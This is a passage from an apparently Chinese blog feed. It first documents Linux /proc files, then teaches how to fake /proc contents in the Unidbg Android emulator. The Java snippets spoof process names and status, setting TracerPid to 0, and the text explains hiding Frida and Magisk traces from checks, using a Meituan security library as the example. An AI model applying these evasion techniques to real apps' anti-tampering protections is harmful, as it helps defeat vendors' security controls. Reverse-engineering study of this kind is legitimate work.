wchan</code></pre><h5 id="1-01-cmdline"><a href="#1-01-cmdline" class="headerlink" title="1.01 cmdline"></a>1.01 cmdline</h5><ul><li>启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息</li></ul><pre><code class="language-shell">┌──(root㉿NshIdE)-[/home/nshide-kali]└─# more /proc/38/cmdlinebash</code></pre><h5 id="1-02-cwd"><a href="#1-02-cwd" class="headerlink" title="1.02 cwd"></a>1.02 cwd</h5><ul><li>指当前进程运行目录的一个符号链接</li></ul><h5 id="1-03-environ"><a href="#1-03-environ" class="headerlink" title="1.03 environ"></a>1.03 environ</h5><ul><li>当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</li></ul><h5 id="1-04-exe"><a href="#1-04-exe" class="headerlink" title="1.04 exe"></a>1.04 exe</h5><ul><li>指向启动当前进程的可执行文件（完整路径）的符号链接，通过 &#x2F;proc&#x2F;N&#x2F;exe 可以启动当前进程的一个拷贝</li></ul><h5 id="1-05-fd"><a href="#1-05-fd" class="headerlink" title="1.05 fd"></a>1.05 fd</h5><ul><li>这是个目录，包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接</li></ul><h5 id="1-06-limits"><a href="#1-06-limits" class="headerlink" title="1.06 limits"></a>1.06 limits</h5><ul><li>当前进程所使用的每一个受限资源的软限制、硬限制和管理单元；此文件仅可由实际启动当前进程的UID用户读取</li></ul><h5 id="1-07-maps"><a href="#1-07-maps" class="headerlink" title="1.07 maps"></a>1.07 maps</h5><ul><li>当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表</li></ul><h5 id="1-08-mem"><a href="#1-08-mem" class="headerlink" title="1.08 mem"></a>1.08 mem</h5><ul><li>当前进程所占用的内存空间，由open、read和lseek等系统调用使用，不能被用户读取</li></ul><h5 id="1-09-root"><a href="#1-09-root" class="headerlink" title="1.09 root"></a>1.09 root</h5><ul><li>指向当前进程运行根目录的符号链接(即当前进程所看到的“根目录”（&#x2F;）是什么)；在Unix和Linux系统上，通常采用chroot命令使每个进程运行于独立的根目录</li></ul><h5 id="1-10-stat"><a href="#1-10-stat" class="headerlink" title="1.10 stat"></a>1.10 stat</h5><ul><li>当前进程的状态信息，包含一系列格式化后的数据列，可读性差，通常由 ps 命令使用</li></ul><h5 id="1-11-statm"><a href="#1-11-statm" class="headerlink" title="1.11 statm"></a>1.11 statm</h5><ul><li>当前进程占用内存的状态信息，通常以“页面”(page)表示</li></ul><h5 id="1-20-status"><a href="#1-20-status" class="headerlink" title="1.20 status"></a>1.20 status</h5><ul><li>与 stat 所提供信息类似，但可读性较好，每行表示一个属性信息；其详细介绍请参见 proc 的 man 手册页</li></ul><h5 id="1-21-task"><a href="#1-21-task" class="headerlink" title="1.21 task"></a>1.21 task</h5><ul><li>目录文件，包含由当前进程所运行的每一个线程的相关信息，每一个线程的相关信息文件均保存在一个由线程号(TID)命名的目录中</li></ul><h4 id="二、-proc-目录下常见的文件介绍"><a href="#二、-proc-目录下常见的文件介绍" class="headerlink" title="二、&#x2F;proc 目录下常见的文件介绍"></a>二、&#x2F;proc 目录下常见的文件介绍</h4><h5 id="2-01-proc-apm"><a href="#2-01-proc-apm" class="headerlink" title="2.01 &#x2F;proc&#x2F;apm"></a>2.01 &#x2F;proc&#x2F;apm</h5><ul><li>高级电源管理(APM)版本信息以及电池相关状态信息，通常由 apm 命令使用</li></ul><h5 id="2-02-proc-buddyinfo"><a href="#2-02-proc-buddyinfo" class="headerlink" title="2.02 &#x2F;proc&#x2F;buddyinfo"></a>2.02 &#x2F;proc&#x2F;buddyinfo</h5><ul><li>用于诊断内存碎片问题的相关信息文件</li></ul><h5 id="2-03-proc-cmdline"><a href="#2-03-proc-cmdline" class="headerlink" title="2.03 &#x2F;proc&#x2F;cmdline"></a>2.03 &#x2F;proc&#x2F;cmdline</h5><ul><li>在启动时传递至内核的相关参数信息，这些信息通常由 lilo 或 grub 等启动管理工具进行传递</li></ul><h5 id="2-04-proc-cpuinfo"><a href="#2-04-proc-cpuinfo" class="headerlink" title="2.04 &#x2F;proc&#x2F;cpuinfo"></a>2.04 &#x2F;proc&#x2F;cpuinfo</h5><ul><li>处理器相关信息文件</li></ul><h5 id="2-05-proc-crypto"><a href="#2-05-proc-crypto" class="headerlink" title="2.05 &#x2F;proc&#x2F;crypto"></a>2.05 &#x2F;proc&#x2F;crypto</h5><ul><li>系统上已安装的内核使用的密码算法以及每个算法的详细信息列表</li></ul><h5 id="2-06-proc-devices"><a href="#2-06-proc-devices" class="headerlink" title="2.06 &#x2F;proc&#x2F;devices"></a>2.06 &#x2F;proc&#x2F;devices</h5><ul><li>系统已经加载的所有设备和字符设备的信息，包含主设备号和设备组(与主设备号对应的设备类型)</li></ul><h5 id="2-07-proc-diskstats"><a href="#2-07-proc-diskstats" class="headerlink" title="2.07 &#x2F;proc&#x2F;diskstats"></a>2.07 &#x2F;proc&#x2F;diskstats</h5><ul><li>每块磁盘设备的磁盘 I&#x2F;O 统计信息列表</li></ul><h5 id="2-08-proc-dma"><a href="#2-08-proc-dma" class="headerlink" title="2.08 &#x2F;proc&#x2F;dma"></a>2.08 &#x2F;proc&#x2F;dma</h5><ul><li>每个正在使用且注册的 ISA DMA 通道的信息列表</li></ul><h5 id="2-09-proc-execdomains"><a href="#2-09-proc-execdomains" class="headerlink" title="2.09 &#x2F;proc&#x2F;execdomains"></a>2.09 &#x2F;proc&#x2F;execdomains</h5><ul><li>内核当前支持的执行域(每种操作系统独特“个性”)信息列表</li></ul><h5 id="2-10-proc-fb"><a href="#2-10-proc-fb" class="headerlink" title="2.10 &#x2F;proc&#x2F;fb"></a>2.10 &#x2F;proc&#x2F;fb</h5><ul><li>帧缓冲设备列表文件，包含帧缓冲设备的设备号和相关驱动信息</li></ul><h5 id="2-11-proc-filesystems"><a href="#2-11-proc-filesystems" class="headerlink" title="2.11 &#x2F;proc&#x2F;filesystems"></a>2.11 &#x2F;proc&#x2F;filesystems</h5><ul><li>当前被内核支持的文件系统类型列表文件，被表示为 nodev 的文件系统表示不需要块设备的支持；通常 mount 一个设备时，如果没有指定文件系统类型将通过此文件来决定其所需文件系统的类型</li></ul><h5 id="2-12-proc-interrupts"><a href="#2-12-proc-interrupts" class="headerlink" title="2.12 &#x2F;proc&#x2F;interrupts"></a>2.12 &#x2F;proc&#x2F;interrupts</h5><ul><li>x86 或者 x86_64 体系架构系统上每个 IRQ 相关的中断号列表；多路处理器平台上每个 CPU  对于每个 I&#x2F;O 设备均有自己的中断号</li></ul><h5 id="2-13-proc-iomen"><a href="#2-13-proc-iomen" class="headerlink" title="2.13 &#x2F;proc&#x2F;iomen"></a>2.13 &#x2F;proc&#x2F;iomen</h5><ul><li>每个物理设备上的记忆体(RAM 或者 ROM)在系统内存中的映射信息</li></ul><h5 id="2-14-proc-ioports"><a href="#2-14-proc-ioports" class="headerlink" title="2.14 &#x2F;proc&#x2F;ioports"></a>2.14 &#x2F;proc&#x2F;ioports</h5><ul><li>当前正在使用且已经注册过的与物理设备进行通讯的输入-输出端口范围信息列表</li></ul><h5 id="2-15-proc-kallsyms"><a href="#2-15-proc-kallsyms" class="headerlink" title="2.15 &#x2F;proc&#x2F;kallsyms"></a>2.15 &#x2F;proc&#x2F;kallsyms</h5><ul><li>模块管理工具，用来动态链接或者绑定可装载模块的符号定义，由内核输出；(内核 2.5.71 以后的版本支持此功能)；通常这个文件中的信息量相当大</li></ul><h5 id="2-16-proc-kcore"><a href="#2-16-proc-kcore" class="headerlink" title="2.16 &#x2F;proc&#x2F;kcore"></a>2.16 &#x2F;proc&#x2F;kcore</h5><ul><li>系统使用的物理内存，以 ELF 核心文件(core file) 格式存储，其文件大小为已使用的物理内存(RAM)加上 4KB；这个文件用来检查内核数据结构当前状态，因此，通常由 GDB 调试工具使用，但不能使用文件查看命令打开此文件</li></ul><h5 id="2-17-proc-kmsg"><a href="#2-17-proc-kmsg" class="headerlink" title="2.17 &#x2F;proc&#x2F;kmsg"></a>2.17 &#x2F;proc&#x2F;kmsg</h5><ul><li>此文件用来保存由内核输出的信息，通常由 &#x2F;sbin&#x2F;klogd 或者 bin&#x2F;dmsg 等程序使用，不要试图使用查看命令打开此文件</li></ul><h5 id="2-18-proc-loadavg"><a href="#2-18-proc-loadavg" class="headerlink" title="2.18 &#x2F;proc&#x2F;loadavg"></a>2.18 &#x2F;proc&#x2F;loadavg</h5><p>保存关于 CPU 和磁盘 I&#x2F;O 的负载平均值，其前三列分别表示每1秒钟、每5秒钟以及每15秒钟的负载平均值，类似于 uptime 命令输出的相关信息；第四列是由斜线隔开的两个数值，前者表示当前正由内核调度的实体(进程和线程)的数目，后者表示系统当前存活的内核调度实体的数目；第五列表示此文件被查看前最近一个内核创建的进程PID</p><h5 id="2-19-proc-locks"><a href="#2-19-proc-locks" class="headerlink" title="2.19 &#x2F;proc&#x2F;locks"></a>2.19 &#x2F;proc&#x2F;locks</h5><ul><li>保存当前由内核锁定的文件的相关信息，包含内核内部的调试数据；每个锁定占据一行，且具有一个唯一的编号；如下输出信息中每行的第二列表示当前锁定使用的锁定类别，POSIX表示目前较新类型的文件锁，由lockf系统调用产生，FLOCK是传统的UNIX文件锁，由flock系统调用产生；第三列也通常由两种类型，ADVISORY表示不允许其他用户锁定此文件，但允许读取，MANDATORY表示此文件锁定期间不允许其他用户任何形式的访问；</li></ul><pre><code class="language-shell">[root@rhel5 ~]# more /proc/locks1: POSIX  ADVISORY  WRITE 4904 fd:00:4325393 0 EOF2: POSIX  ADVISORY  WRITE 4550 fd:00:2066539 0 EOF3: FLOCK  ADVISORY  WRITE 4497 fd:00:2066533 0 EOF</code></pre><h5 id="2-20-proc-mdstat"><a href="#2-20-proc-mdstat" class="headerlink" title="2.20 &#x2F;proc&#x2F;mdstat"></a>2.20 &#x2F;proc&#x2F;mdstat</h5><ul><li><p>保存RAID相关的多块磁盘的当前状态信息，在没有使用RAID机器上，其显示为如下状态：</p><pre><code class="language-shell">[root@rhel5 ~]# less /proc/mdstatPersonalities :unused devices: &lt;none&gt;</code></pre></li></ul><h5 id="2-21-proc-meminfo"><a href="#2-21-proc-meminfo" class="headerlink" title="2.21 &#x2F;proc&#x2F;meminfo"></a>2.21 &#x2F;proc&#x2F;meminfo</h5><ul><li><p>系统中关于当前内存的利用状况等的信息，常由free命令使用；可以使用文件查看命令直接读取此文件，其内容显示为两列，前者为统计属性，后者为对应的值</p><pre><code class="language-shell">[root@rhel5 ~]# less /proc/meminfoMemTotal:       515492 kBMemFree:          8452 kBBuffers:         19724 kBCached:         376400 kBSwapCached:          4 kB…………</code></pre></li></ul><h5 id="2-22-proc-mounts"><a href="#2-22-proc-mounts" class="headerlink" title="2.22 &#x2F;proc&#x2F;mounts"></a>2.22 &#x2F;proc&#x2F;mounts</h5><ul><li>在内核2.4.29版本以前，此文件的内容为系统当前挂载的所有文件系统，在2.4.19以后的内核中引进了每个进程使用独立挂载名称空间的方式，此文件则随之变成了指向&#x2F;proc&#x2F;self&#x2F;mounts（每个进程自身挂载名称空间中的所有挂载点列表）文件的符号链接；&#x2F;proc&#x2F;self是一个独特的目录，后文中会对此目录进行介绍</li></ul><pre><code class="language-shell">[root@rhel5 ~]# ll /proc |grep mountslrwxrwxrwx  1 root      root             11 Feb  8 06:43 mounts -&gt; self/mounts</code></pre><p>如下所示，其中第一列表示挂载的设备，第二列表示在当前目录树中的挂载点，第三点表示当前文件系统的类型，第四列表示挂载属性（ro或者rw），第五列和第六列用来匹配&#x2F;etc&#x2F;mtab文件中的转储（dump）属性</p><pre><code class="language-shell">[root@rhel5 ~]# more /proc/mountsrootfs / rootfs rw 0 0/dev/root / ext3 rw,data=ordered 0 0/dev /dev tmpfs rw 0 0/proc /proc proc rw 0 0/sys /sys sysfs rw 0 0/proc/bus/usb /proc/bus/usb usbfs rw 0 0…………</code></pre><h5 id="2-23-proc-modules"><a href="#2-23-proc-modules" class="headerlink" title="2.23 &#x2F;proc&#x2F;modules"></a>2.23 &#x2F;proc&#x2F;modules</h5><ul><li>当前装入内核的所有模块名称列表，可以由lsmod命令使用，也可以直接查看；如下所示，其中第一列表示模块名，第二列表示此模块占用内存空间大小，第三列表示此模块有多少实例被装入，第四列表示此模块依赖于其它哪些模块，第五列表示此模块的装载状态（Live：已经装入；Loading：正在装入；Unloading：正在卸载），第六列表示此模块在内核内存（kernel memory）中的偏移量</li></ul><pre><code class="language-shell">[root@rhel5 ~]# more /proc/modulesautofs4 24517 2 - Live 0xe09f7000hidp 23105 2 - Live 0xe0a06000rfcomm 42457 0 - Live 0xe0ab3000l2cap 29505 10 hidp,rfcomm, Live 0xe0aaa000…………</code></pre><h5 id="2-24-proc-partitions"><a href="#2-24-proc-partitions" class="headerlink" title="2.24 &#x2F;proc&#x2F;partitions"></a>2.24 &#x2F;proc&#x2F;partitions</h5><ul><li>块设备每个分区的主设备号（major）和次设备号（minor）等信息，同时包括每个分区所包含的块（block）数目（如下面输出中第三列所示）</li></ul><pre><code class="language-shell">[root@rhel5 ~]# more /proc/partitionsmajor minor  #blocks  name   8     0   20971520 sda   8     1     104391 sda1   8     2    6907950 sda2   8     3    5630782 sda3   8     4          1 sda4   8     5    3582463 sda5</code></pre><h5 id="2-25-proc-pci"><a href="#2-25-proc-pci" class="headerlink" title="2.25 &#x2F;proc&#x2F;pci"></a>2.25 &#x2F;proc&#x2F;pci</h5><ul><li>内核初始化时发现的所有PCI设备及其配置信息列表，其配置信息多为某PCI设备相关IRQ信息，可读性不高，可以用“&#x2F;sbin&#x2F;lspci –vb”命令获得较易理解的相关信息；在2.6内核以后，此文件已为&#x2F;proc&#x2F;bus&#x2F;pci目录及其下的文件代替</li></ul><h5 id="2-26-proc-slabinfo"><a href="#2-26-proc-slabinfo" class="headerlink" title="2.26 &#x2F;proc&#x2F;slabinfo"></a>2.26 &#x2F;proc&#x2F;slabinfo</h5><ul><li>在内核中频繁使用的对象（如inode、dentry等）都有自己的cache，即slab pool，而&#x2F;proc&#x2F;slabinfo文件列出了这些对象相关slap的信息；详情可以参见内核文档中slapinfo的手册页</li></ul><h5 id="2-27-proc-stat"><a href="#2-27-proc-stat" class="headerlink" title="2.27 &#x2F;proc&#x2F;stat"></a>2.27 &#x2F;proc&#x2F;stat</h5><ul><li>实时追踪自系统上次启动以来的多种统计信息；如下所示，其中，<br>“<strong>cpu</strong>”行后的八个值分别表示以1&#x2F;100（jiffies）秒为单位的统计值（包括系统运行于用户模式、低优先级用户模式，运系统模式、空闲模式、I&#x2F;O等待模式的时间等）；<br>“<strong>intr</strong>”行给出中断的信息，第一个为自系统启动以来，发生的所有的中断的次数；然后每个数对应一个特定的中断自系统启动以来所发生的次数；<br>“<strong>ctxt</strong>”给出了自系统启动以来CPU发生的上下文交换的次数。<br>“<strong>btime</strong>”给出了从系统启动到现在为止的时间，单位为秒；<br>“<strong>processes</strong>“ (total_forks) 自系统启动以来所创建的任务的个数目；<br>“<strong>procs_running</strong>”：当前运行队列的任务的数目；<br>“<strong>procs_blocked</strong>”：当前被阻塞的任务的数目；</li></ul><h5 id="2-28-proc-swaps"><a href="#2-28-proc-swaps" class="headerlink" title="2.28 &#x2F;proc&#x2F;swaps"></a>2.28 &#x2F;proc&#x2F;swaps</h5><ul><li>当前系统上的交换分区及其空间利用信息，如果有多个交换分区的话，则会每个交换分区的信息分别存储于&#x2F;proc&#x2F;swap目录中的单独文件中，而其优先级数字越低，被使用到的可能性越大；下面是作者系统中只有一个交换分区时的输出信息</li></ul><h5 id="2-29-proc-uptime"><a href="#2-29-proc-uptime" class="headerlink" title="2.29 &#x2F;proc&#x2F;uptime"></a>2.29 &#x2F;proc&#x2F;uptime</h5><ul><li>系统上次启动以来的运行时间，如下所示，其第一个数字表示系统运行时间，第二个数字表示系统空闲时间，单位是秒</li></ul><pre><code class="language-shell">[root@rhel5 ~]# more /proc/uptime3809.86 3714.13</code></pre><h5 id="2-30-proc-version"><a href="#2-30-proc-version" class="headerlink" title="2.30 &#x2F;proc&#x2F;version"></a>2.30 &#x2F;proc&#x2F;version</h5><ul><li>当前系统运行的内核版本号</li></ul><h5 id="2-31-proc-vmstat"><a href="#2-31-proc-vmstat" class="headerlink" title="2.31 &#x2F;proc&#x2F;vmstat"></a>2.31 &#x2F;proc&#x2F;vmstat</h5><ul><li>当前系统虚拟内存的多种统计数据，信息量可能会比较大，这因系统而有所不同，可读性较好</li></ul><h5 id="2-32-proc-zoneinfo"><a href="#2-32-proc-zoneinfo" class="headerlink" title="2.32 &#x2F;proc&#x2F;zoneinfo"></a>2.32 &#x2F;proc&#x2F;zoneinfo</h5><ul><li>内存区域（zone）的详细信息列表，信息量较大</li></ul><h4 id="三、-proc-sys目录详解"><a href="#三、-proc-sys目录详解" class="headerlink" title="三、&#x2F;proc&#x2F;sys目录详解"></a>三、&#x2F;proc&#x2F;sys目录详解</h4><p>​        与 &#x2F;proc下其它文件的“只读”属性不同的是，管理员可对&#x2F;proc&#x2F;sys子目录中的许多文件内容进行修改以更改内核的运行特性，事先可以使用“ls -l”命令查看某文件是否“可写入”。写入操作通常使用类似于“echo DATA &gt; &#x2F;path&#x2F;to&#x2F;your&#x2F;filename”的格式进行。需要注意的是，即使文件可写，其一般也不可以使用编辑器进行编辑。</p><h5 id="3-01-proc-sys-debug子目录"><a href="#3-01-proc-sys-debug子目录" class="headerlink" title="3.01 &#x2F;proc&#x2F;sys&#x2F;debug子目录"></a>3.01 &#x2F;proc&#x2F;sys&#x2F;debug子目录</h5><ul><li>此目录通常是一空目录</li></ul><h5 id="3-02-proc-sys-dev子目录"><a href="#3-02-proc-sys-dev子目录" class="headerlink" title="3.02  &#x2F;proc&#x2F;sys&#x2F;dev子目录"></a>3.02  &#x2F;proc&#x2F;sys&#x2F;dev子目录</h5><ul><li>为系统上特殊设备提供参数信息文件的目录，其不同设备的信息文件分别存储于不同的子目录中，如大多数系统上都会具有的&#x2F;proc&#x2F;sys&#x2F;dev &#x2F;cdrom和&#x2F;proc&#x2F;sys&#x2F;dev&#x2F;raid（如果内核编译时开启了支持raid的功能） 目录，其内存储的通常是系统上cdrom和raid的相关参数信息文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unidbg 中处理文件访问(二)</title>
      <link href="/2025/07/24/Unidbg%20%E4%B8%AD%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2025/07/24/Unidbg%20%E4%B8%AD%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Unidbg-中处理文件访问（二）"><a href="#Unidbg-中处理文件访问（二）" class="headerlink" title="Unidbg 中处理文件访问（二）"></a>Unidbg 中处理文件访问（二）</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本文主题是 proc 伪文件系统，请读者先了解它，本篇讨论在 Unidbg 里如何补其中对应的文件。</p><h3 id="二、概述"><a href="#二、概述" class="headerlink" title="二、概述"></a>二、概述</h3><p>proc是一个由内核动态创建和生成的目录，程序通过访问它，获取各种各样的内核信息。首先的问题必然是为什么要把它单独拎出来讲，它和其他文件访问在补环境上有什么差异？我给出两点理由：</p><ul><li>访问频率高——文件访问中最高频处理的目录</li><li>容易出错——尽管整体上的处理和普通文件一样，但局部需要特殊处理</li></ul><h4 id="2-1-cmdline"><a href="#2-1-cmdline" class="headerlink" title="2.1 cmdline"></a>2.1 cmdline</h4><p>&#x2F;proc&#x2F;self(pid)&#x2F;cmdline 用于常看自身进程名，常用于信息收集或检测运行环境是否有异常。比如，有些分析人员喜欢将样本 so 移到自己的 Android demo 中加载调试。关于它有几点需要知道，首先，遇到了它一定要补，它可不是什么无足轻重的文件访问，校验进程名是很重要的代码逻辑；其次，pid 在 Unidbg 中每次运行都会变化，因此硬编码无法顺利匹配下一次运行的 pid，请规范处理。</p><pre><code class="language-Java">// Aif ((&quot;/proc/&quot;+emulator.getPid()+&quot;/cmdline&quot;).equals(pathname) || (&quot;/proc/self/cmdline&quot;).equals(pathname)) &#123;    // 具体处理逻辑&#125;// Bif (pathname.contains(&quot;cmdline&quot;)) &#123;    // 具体处理逻辑&#125;</code></pre><p>对于涉及到 pid 的其他访问路径，也建议一律这么做。而且假设 Unidbg 访问 <strong>&#x2F;proc&#x2F;1234&#x2F;maps</strong> 或 <strong>&#x2F;proc&#x2F;self&#x2F;maps</strong>，你不应该通过 adb 在同样的位置去找它，因为 Unidbg 和真实环境的 pid 显然没有对应关系，应该通过 <strong>ps | grep packgeName</strong> 找到目标 app 在真机上的 pid，然后去做对应的查看。</p><p>最后，对于进程名这个需求，没必要从真机拷贝出对应文件，直接 cat 查看，然后用 <strong>ByteArrayFileIO</strong> 处理就很方便，结尾记得加上 \0，这是 cmdline 的格式规范，不加的话在解析时存在出错的可能性。</p><pre><code class="language-Java">// 查看当前进程名if ((&quot;/proc/&quot;+emulator.getPid()+&quot;/cmdline&quot;).equals(pathname) || (&quot;/proc/self/cmdline&quot;).equals(pathname)) &#123;    return FileResult.success(new ByteArrayFileIO(oflags, pathname, &quot;name\0&quot;.getBytes()));&#125;</code></pre><h4 id="2-2-status"><a href="#2-2-status" class="headerlink" title="2.2 status"></a>2.2 status</h4><p>&#x2F;proc&#x2F;self(pid)&#x2F;status 最主要用来检测 tracepid 状态，因此偷懒的话可以像下面这样干</p><pre><code class="language-Java">if ((&quot;proc/&quot; + emulator.getPid() + &quot;/status&quot;).equals(pathname)) &#123;    return FileResult.success(new ByteArrayFileIO(oflags, pathname, (&quot;TracerPid: 0&quot;).getBytes()));&#125;</code></pre><p>这么做并非毫无风险，样本也可能会校验和关注其他字段，所以像下面这样补更规范一些。</p><pre><code class="language-Java">if(pathname.equals(&quot;proc/&quot;+emulator.getPid()+&quot;/status&quot;))&#123;    return FileResult.success(new ByteArrayFileIO(oflags, pathname,            (&quot;Name:   ip.android.view\n&quot; +            &quot;Umask:  0077\n&quot; +            &quot;State:  S (sleeping)\n&quot; +            &quot;Tgid:   &quot;+emulator.getPid()+&quot;\n&quot; +            &quot;Ngid:   0\n&quot; +            &quot;Pid:    &quot;+emulator.getPid()+&quot;\n&quot; +            &quot;PPid:   6119\n&quot; +            &quot;TracerPid:      0\n&quot; +            &quot;Uid:    10494   10494   10494   10494\n&quot; +            &quot;Gid:    10494   10494   10494   10494\n&quot; +            &quot;FDSize: 512\n&quot; +            &quot;Groups: 3002 3003 9997 20494 50494 99909997\n&quot; +            &quot;VmPeak:  2543892 kB\n&quot; +            &quot;VmSize:  2466524 kB\n&quot; +            &quot;VmLck:         0 kB\n&quot; +            &quot;VmPin:         0 kB\n&quot; +            &quot;VmHWM:    475128 kB\n&quot; +            &quot;VmRSS:    415548 kB\n&quot; +            &quot;RssAnon:          144072 kB\n&quot; +            &quot;RssFile:          267216 kB\n&quot; +            &quot;RssShmem:           4260 kB\n&quot; +            &quot;VmData:  1488008 kB\n&quot; +            &quot;VmStk:      8192 kB\n&quot; +            &quot;VmExe:        20 kB\n&quot; +            &quot;VmLib:    239368 kB\n&quot; +            &quot;VmPTE:      2360 kB\n&quot; +            &quot;VmPMD:        16 kB\n&quot; +            &quot;VmSwap:    13708 kB\n&quot; +            &quot;Threads:        122\n&quot; +            &quot;SigQ:   0/21555\n&quot; +            &quot;SigPnd: 0000000000000000\n&quot; +            &quot;ShdPnd: 0000000000000000\n&quot; +            &quot;SigBlk: 0000000080001204\n&quot; +            &quot;SigIgn: 0000000000000001\n&quot; +            &quot;SigCgt: 0000000e400096fc\n&quot; +            &quot;CapInh: 0000000000000000\n&quot; +            &quot;CapPrm: 0000000000000000\n&quot; +            &quot;CapEff: 0000000000000000\n&quot; +            &quot;CapBnd: 0000000000000000\n&quot; +            &quot;CapAmb: 0000000000000000\n&quot; +            &quot;Seccomp:        2\n&quot; +            &quot;Speculation_Store_Bypass:       unknown\n&quot; +            &quot;Cpus_allowed:   07\n&quot; +            &quot;Cpus_allowed_list:      0-2\n&quot; +            &quot;Mems_allowed:   1\n&quot; +            &quot;Mems_allowed_list:      0\n&quot; +            &quot;voluntary_ctxt_switches:        17290\n&quot; +            &quot;nonvoluntary_ctxt_switches:     10433&quot;).getBytes(StandardCharsets.UTF_8)));&#125;</code></pre><h4 id="2-3-net"><a href="#2-3-net" class="headerlink" title="2.3 net"></a>2.3 net</h4><p>&#x2F;proc&#x2F;net 下的文件一律不要补，有两个理由。</p><ul><li>一是 Google 禁止普通进程访问该目录，这一规定对 Android 10 以及更高版本均有效，所以我们伪装成高版本，多一事不如少一事，少补几个文件而且无副作用，岂不美哉。</li><li>二是这个目录主要用于检测环境，比如 IDA&#x2F;Frida Server 的端口检测。将真机的对应文件一股脑拷贝过来，还可能把风险信息和检测点带过来。</li></ul><p>简而言之，允许不补，补了还容易出错，你说该怎么办？其中最常见的下面这几个</p><pre><code class="language-shell">/proc/net/arp/proc/net/tcp/proc/net/unix</code></pre><h4 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a>2.4 信息获取</h4><p>遇见下面这些文件，建议正常补，而且了解每个文件的用途，在生产环境上部分需要随机化。</p><pre><code class="language-shell">/proc/meminfo/proc/version/proc/cpuinfo/proc/stat/proc/asound/cardX/id/proc/self/exe</code></pre><h4 id="2-5-map"><a href="#2-5-map" class="headerlink" title="2.5 map"></a>2.5 map</h4><p>&#x2F;proc&#x2F;self(pid)&#x2F;maps 是补 proc 文件访问中最重要的一项，请读者良好处理每一次 maps 访问。因为 maps 访问频率高以及地位特殊，Unidbg 中对它做了专门的处理——如果在自定义 IOResolver 中没有得到处理，会在最后的虚拟文件系统这一块进行如下处理。</p><pre><code class="language-Java">// src/main/java/com/github/unidbg/file/linux/LinuxFileSystem.java@Overridepublic FileResult&lt;AndroidFileIO&gt; open(String pathname, int oflags) &#123;    if (&quot;/proc/self/maps&quot;.equals(pathname) || (&quot;/proc/&quot; + emulator.getPid() + &quot;/maps&quot;).equals(pathname)) &#123;        return FileResult.&lt;AndroidFileIO&gt;success(new MapsFileIO(oflags, pathname, emulator.getMemory().getLoadedModules()));    &#125;    return super.open(pathname, oflags);&#125;</code></pre><p>MapsFileIO 是 Unidbg 所设计的 fakemaps，它反应了 Unidbg 内存环境中的模块信息，即在语义和格式都等价于真实的 maps，如下就是 libmtguard.so 对应的 fakemaps。</p><pre><code class="language-Java">40000000-400cd000 r-xp 00000000 b3:19 0          /data/app/com.sankuai.meituan-1/lib/arm/libmtguard.so400cd000-400ea000 rw-p 000cd890 b3:19 0          /data/app/com.sankuai.meituan-1/lib/arm/libmtguard.so400ea000-40104000 r-xp 00000000 b3:19 0          /system/lib/libz.so40104000-40106000 rw-p 0001ace0 b3:19 0          /system/lib/libz.so40108000-40190000 r-xp 00002000 b3:19 0          /system/lib/libc++.so40191000-40197000 rw-p 0008b410 b3:19 0          /system/lib/libc++.so40197000-40199000 r-xp 00000000 b3:19 0          /system/lib/libdl.so40199000-4019b000 rw-p 00002edc b3:19 0          /system/lib/libdl.so4019b000-4020e000 r-xp 00000000 b3:19 0          /system/lib/libc.so4020e000-4021f000 rw-p 00073f60 b3:19 0          /system/lib/libc.so4021f000-4023e000 r-xp 00000000 b3:19 0          /system/lib/libm.so4023f000-40241000 rw-p 00020c5c b3:19 0          /system/lib/libm.so40241000-40249000 r-xp 00000000 b3:19 0          /system/lib/liblog.so40249000-4024b000 rw-p 00008d08 b3:19 0          /system/lib/liblog.so4024b000-40250000 r-xp 00000000 b3:19 0          /system/lib/libstdc++.so40250000-40252000 rw-p 00005dec b3:19 0          /system/lib/libstdc++.so</code></pre><p>从客观上讲，这个 maps 确实能处理一些问题。比如样本访问 maps，检测其中是否有 frida &#x2F; xposed &#x2F; substrate &#x2F; magisk &#x2F; riru 等风险模块，真实 maps 会暴露这些信息，而 Unidbg fakeMaps 很干净、简洁，所以不会有任何问题。</p><p>既然 Unidbg 对 maps 做了这样周到的处理，为什么还要关注 maps 呢？请读者考虑 fakeMaps 和真实 maps 的关系，fakeMaps 仅包含按目标模块及其依赖的信息，真实 maps 包含整个进程所涉及的所有模块信息，两者关系如下。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250808113259123.png" alt="image-20250808113259123"></p><p>因此在内容上，fakeMaps 是真实 maps 的子集，后者包含了许多前者不具备的信息。如果样本试图获取小框以外的信息，就会出问题。</p><ul><li>比如真实 maps 包含当前进程所对应 apk，可以访问和解析它，做签名校验。</li><li>比如有些样本会检测安全 SDK 是否已加载，未加载就不提供服务，判断逻辑是 maps 中是否能找到安全 SDK 对应的so。</li></ul><p>上面两个逻辑，没法依靠 fakeMaps 实现处理。既然 fakeMaps 有这样的问题，使用真实 maps 会好吗？对于上面两个问题，使用真实 maps 就解决了问题。但在另外一些场景里，fakeMaps 可行，真实 maps 会出问题，下面开始举例。</p><p>我们知道，maps 反映了内存布局的详细情况，那么如果样本根据 maps 做内存访问呢？比如检查目标函数所属的 libshell-superv.2019.so 是否被inline hook，又或者遍历内存寻找 frida 等工具的特征字符串等等。maps 所指引的 755118f000-75511d2000 在真实运行环境上，是目标 so 起始的一段内存，但在 Unidbg 环境里，这段内存甚至没有开辟。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250808113922335.png" 